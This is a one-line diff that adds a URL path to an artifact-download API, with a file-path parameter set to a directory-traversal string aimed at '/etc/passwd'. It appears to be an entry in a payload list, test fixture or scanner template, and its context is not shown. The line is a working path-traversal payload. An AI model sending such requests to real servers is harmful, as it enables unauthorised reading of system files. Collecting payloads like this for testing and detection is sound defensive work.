@@ -1,0 +1,1 @@
+/api/v1/artifact/getArtifact?artifact_path=../../../../../etc/passwd
